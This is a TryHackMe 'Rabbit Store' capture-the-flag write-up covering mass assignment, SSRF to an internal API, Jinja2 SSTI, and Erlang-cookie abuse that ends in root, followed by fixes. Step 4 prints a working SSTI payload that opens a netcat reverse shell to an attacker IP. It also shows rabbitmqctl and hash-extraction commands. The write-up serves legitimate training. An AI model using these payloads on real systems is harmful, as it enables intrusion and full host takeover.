@@ -1,0 +1,234 @@
+---
+title: 'Rabbit Store'
+description: "Mass-assignment activates a locked account, an SSRF 'store from URL' feature reaches an internal API, a reflected username field hits a Jinja2 backend for SSTI RCE, then a world-readable Erlang cookie turns a RabbitMQ admin hash into the box's root password."
+date: 2026-01-11
+platform: tryhackme
+room: 'Rabbit Store'
+roomUrl: 'https://tryhackme.com/room/rabbitstore'
+difficulty: medium
+tags:
+  - 'web'
+  - 'ssrf'
+  - 'ssti'
+  - 'rce'
+  - 'mass-assignment'
+  - 'rabbitmq'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'mass assignment'
+  - 'server-side request forgery'
+  - 'server-side template injection'
+  - 'world-readable secret file'
+  - 'password reuse'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Rabbit Store — Mass Assignment to SSRF to Jinja2 RCE, and a RabbitMQ Cookie to Root**
+
+_A walkthrough of the "Rabbit Store" challenge from TryHackMe. A locked-down storage portal hands us the whole box through a chain of small trust mistakes: a registration endpoint that lets us set our own subscription status, a "store file from URL" feature that is really SSRF, an internal API reachable only through that SSRF, a reflected field that lands on a Jinja2 backend for server-side template injection, and finally a world-readable Erlang cookie that lets us pull RabbitMQ's admin hash — which is literally reused as the system root password._
+
+> Flags, credentials, the Erlang cookie, and the recovered root hash are redacted. Rabbit Store is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` or `THM{<redacted>}` are real on the box but withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+`POST /api/register` trusts a client-supplied `subscription` field → register with `"subscription":"active"` (**mass assignment**) to unlock the dashboard → the dashboard's "store from URL" (`/api/store-url`) fetches any URL we give it (**SSRF**) → point it at `http://127.0.0.1:3000/api/docs` to reach the **internal Express API** (the public Apache front refuses `/api/docs`) → a newly exposed `/api/fetch_messeges_from_chatbot` reflects our `username` into a **Jinja2** template (Express proxies to an internal Flask app) → **SSTI → RCE** as `azrael` → `/var/lib/rabbitmq/.erlang.cookie` is **world-readable** → authenticate to the RabbitMQ node with `rabbitmqctl`, export definitions, and recover the `root` user's SHA-256 password hash → that hash **is** the box's root password → `su root`.
+
+Every rung is a server trusting input (or a file) it should not.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+A quick `rustscan`/`nmap` shows four interesting ports — and, tellingly, an Erlang/RabbitMQ cluster:
+
+```text
+22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp    open  http    Apache httpd 2.4.52   -> redirects to http://cloudsite.thm/
+4369/tcp  open  epmd    Erlang Port Mapper Daemon (node: rabbit @ 25672)
+25672/tcp open  unknown (RabbitMQ inter-node / CLI port)
+```
+
+The HTTP service redirects to `cloudsite.thm`, and a storage sub-app lives on `storage.cloudsite.thm`, so we add both to `/etc/hosts`:
+
+```text
+$IP   cloudsite.thm storage.cloudsite.thm forge
+```
+
+`storage.cloudsite.thm` is a file-storage portal with login and registration. The `4369`/`25672` pair (EPMD + a `rabbit` node) is a loud hint to keep for privilege escalation later.
+
+### **The vulnerability — a chain of misplaced trust**
+
+The app registers and logs in through a JSON API (`/api/register`, `/api/login`), and the login response carries a **JWT** whose `subscription` claim is `inactive` for fresh accounts — which is why a brand-new account is told it is "not activated" and can do nothing.
+
+<Callout type="insight">
+
+The server decides what we can access from fields it lets _us_ control. Registration accepts a `subscription` value straight from the request body (**mass assignment**), and later the "store a file from a URL" feature fetches whatever URL we hand it from the server side (**SSRF**). Neither "this account is paid" nor "this request came from inside" is actually verified — they are just values the client supplies. That pattern, repeated, is the whole box.
+
+</Callout>
+
+### **Step 1 — mass assignment: activate our own account**
+
+Fuzzing `/api/` reveals `/api/docs` (always `403 Access denied`) and `/api/uploads` (`401` without a token, then _"Your subscription is inactive"_ with one). So we need an **active** subscription. Registration lets us just ask for it:
+
+```text
+POST /api/register
+Content-Type: application/json
+
+{"email":"test1@gmail.com","password":"<redacted>","subscription":"active"}
+```
+
+Logging in with that account now returns a JWT containing `"subscription":"active"`, and we are redirected to `/dashboard/active`. The paywall is gone because the "paid" flag was never the server's to trust.
+
+### **Step 2 — find the SSRF (store from URL)**
+
+The active dashboard loads `/assets/js/custom_script_active.js`, which reveals two more endpoints:
+
+```text
+POST /api/upload       # multipart file upload
+POST /api/store-url    # { "url": "..." } -> server fetches the URL and stores it
+```
+
+We test `/api/store-url` by pointing it at our own web server:
+
+```text
+# attacker
+python3 -m http.server 8000
+
+# then POST {"url":"http://$ATTACKER_IP:8000/test.txt"} to /api/store-url
+# -> 10.x.x.x - - [.. ] "GET /test.txt HTTP/1.1" 200 -
+```
+
+The server fetches our URL — a classic **SSRF**. The stored file shows up in the dashboard and is served back at `/api/uploads/<uuid>`, so we can even read the fetched contents.
+
+### **Step 3 — SSRF into the internal API**
+
+`/api/docs` is blocked at the public edge (Apache), but the actual API is an **Express** app (the responses carry `X-Powered-By: Express`, whose default port is `3000`). Asking the SSRF to fetch the API directly on loopback bypasses the front-end restriction:
+
+```text
+{"url":"http://127.0.0.1:3000/api/docs"}
+```
+
+That returns the internal API documentation, which exposes a new endpoint: `/api/fetch_messeges_from_chatbot`.
+
+### **Step 4 — SSTI to RCE (Express in front, Flask/Jinja2 behind)**
+
+A `POST` to `/api/fetch_messeges_from_chatbot` first demands a `username`, then (with `{"username":"admin"}`) replies that the chatbot is "in development" — but it **reflects our username back**. A polyglot probe triggers a template error:
+
+```text
+{"username":"${{<%[%'\"}}%\\."}
+```
+
+The error comes from **Jinja2** — the Express app proxies this endpoint to an internal **Flask** service, so our input lands in a Python template engine. That is server-side template injection, and Jinja2 SSTI is a reliable path to RCE:
+
+```text
+{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f').read() }}"}
+```
+
+```text
+# attacker
+nc -lvnp 4444
+# connect from $IP ...
+azrael@forge:~/chatbotServer$ id
+uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
+```
+
+After stabilising the shell (`python3 -c 'import pty;pty.spawn("/bin/bash")'`), the user flag is in `azrael`'s home:
+
+```text
+azrael@forge:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 5 — privilege escalation: a world-readable Erlang cookie**
+
+Erlang nodes authenticate to each other with a shared secret, the **Erlang cookie**. On this box it is world-readable:
+
+```text
+azrael@forge:/var/lib/rabbitmq$ ls -al .erlang.cookie
+-r-----r--  1 rabbitmq rabbitmq 16 .. .erlang.cookie      # note the 'r' for others
+azrael@forge:/var/lib/rabbitmq$ cat .erlang.cookie
+<redacted>
+```
+
+With that cookie we can speak to the `rabbit@forge` node as an administrator. `epmd -names` confirms the node, and `rabbitmqctl` lets us enumerate users:
+
+```text
+sudo rabbitmqctl --erlang-cookie '<redacted>' --node rabbit@forge list_users
+# user                                                                         tags
+# The password for the root user is the SHA-256 hashed value of the RabbitMQ
+#   root user's password. Please don't attempt to crack SHA-256.               []
+# root                                                                         [administrator]
+```
+
+The oddly-named "user" is really a **hint**: the system `root` password equals the SHA-256 hash of RabbitMQ's `root` password.
+
+### **Step 6 — recover the root password from the RabbitMQ hash**
+
+Export the RabbitMQ definitions and pull `root`'s stored hash:
+
+```text
+cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
+# "hashing_algorithm": "rabbit_password_hashing_sha256",
+# "password_hash": "<redacted-base64>"
+```
+
+RabbitMQ stores it as `base64(<4-byte salt> + sha256(<4-byte salt> + password))`. Decode to hex and drop the 4-byte (8 hex char) salt prefix; what remains is the raw SHA-256 digest — which, per the hint, _is_ the Linux root password:
+
+```text
+echo "<redacted-base64>" | base64 -d | xxd -p -c 100
+# <8 hex salt><64 hex sha256>
+# strip the first 8 hex chars -> the 64-char SHA-256 = the root password
+```
+
+```text
+azrael@forge:~$ su root
+Password:        # the 64-char SHA-256 string
+root@forge:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+Activated account → SSRF → internal API → SSTI RCE → world-readable cookie → RabbitMQ admin → reused hash → root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Each flaw is serious on its own; chained, they go from anonymous to root:
+
+- **Mass assignment** lets any registrant grant themselves a paid/privileged status the app relies on for access control.
+- **SSRF** turns the server into a proxy into its own trust boundary, defeating an edge restriction that was the only thing "protecting" the internal API.
+- **SSTI** on a Jinja2 backend is direct remote code execution as the app user.
+- **A world-readable Erlang cookie plus a reused secret** collapses privilege escalation to a single `su` — the RabbitMQ admin hash doubles as the host root password.
+
+</Callout>
+
+### **Recommended fix — break every rung**
+
+<Callout type="fix">
+
+1. **Never bind privileges to client-supplied fields.** Set `subscription`/role server-side; ignore those keys on registration. Validate against an allow-list of fields.
+2. **Lock down the URL-fetcher.** Resolve and allow-list destinations, block loopback/link-local/metadata ranges, disable redirects to internal hosts — and don't rely on an edge rule the back-end itself can be made to bypass.
+3. **Never render user input as a template.** Pass data as context variables, use sandboxed/escaped rendering, and keep the chatbot input out of the Jinja2 source string.
+4. **Protect inter-node secrets and stop reusing them.** `.erlang.cookie` must be `0400`, owned by the service account only; the RabbitMQ admin secret must not be the system root password.
+
+</Callout>
+
+### **Takeaways**
+
+- **"Paid", "admin", and "internal" are not facts unless the server checks them.** Mass assignment and SSRF are the same bug twice: trusting a value the client controls.
+- **SSRF is a pivot, not just a fetch.** Its real power here is reaching an API the perimeter was hiding.
+- **Reflected input + a template engine = assume RCE.** A single error message naming Jinja2 is enough to commit to SSTI.
+- **World-readable secrets and reused secrets are a privilege-escalation gift.** Least privilege on `.erlang.cookie`, and unique secrets per system, would have stopped the last two steps cold.
+
+Thanks for reading. Rabbit Store is a clean lesson in chaining: five modest trust failures, none catastrophic alone, add up to anonymous-to-root.
